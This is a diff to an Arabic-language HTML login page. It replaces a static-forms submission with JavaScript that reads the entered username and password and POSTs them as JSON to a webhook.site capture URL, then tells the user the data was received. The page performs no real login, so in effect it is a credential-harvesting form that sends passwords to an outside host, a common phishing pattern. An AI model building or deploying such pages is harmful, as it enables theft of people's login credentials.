@@ -16,7 +16,6 @@
             font-family: Arial, sans-serif;
             margin: 0;
         }
-
         .login-container {
             width: 100%;
             max-width: 400px;
@@ -27,13 +26,6 @@
             text-align: center;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
-
-        .login-container h2 {
-            margin-bottom: 20px;
-            font-size: 24px;
-            color: #333;
-        }
-
         form input {
             width: 100%;
             padding: 10px;
@@ -43,7 +35,6 @@
             font-size: 16px;
             box-sizing: border-box;
         }
-
         form button {
             width: 100%;
             padding: 10px;
@@ -53,9 +44,7 @@
             border-radius: 4px;
             font-size: 16px;
             cursor: pointer;
-            transition: background-color 0.3s ease;
         }
-
         form button:hover {
             background-color: #007bb5;
         }
@@ -64,16 +53,41 @@
 <body>
     <div class="login-container">
         <h2>تسجيل الدخول</h2>
-        <form action="https://staticforms.xyz/submissions" method="POST">
-            <input type="hidden" name="accessKey" value="f38d6bcd-f4fa-4b59-950e-84490f4e5078">
+        <form id="loginForm">
             <input type="text" name="username" placeholder="اسم المستخدم" required>
             <input type="password" name="password" placeholder="كلمة المرور" required>
             <button type="submit">دخول</button>
         </form>
+        <div id="responseMessage"></div>
     </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // منع إعادة تحميل الصفحة
+            
+            const username = e.target.username.value;
+            const password = e.target.password.value;
+
+            // إرسال البيانات إلى Webhook الخاص بك
+            fetch('https://webhook.site/d35f0a15-b44c-433c-a4dc-217e3f44a947', {  // هذا هو عنوان Webhook الخاص بك
+                method: 'POST',
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username, password })
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById('responseMessage').innerText = 'تم استلام البيانات بنجاح!';
+                } else {
+                    document.getElementById('responseMessage').innerText = 'حدث خطأ!';
+                }
+            })
+            .catch(error => {
+                document.getElementById('responseMessage').innerText = 'حدث خطأ في الاتصال!';
+            });
+        });
+    </script>
 </body>
 </html>
-
-
-
-
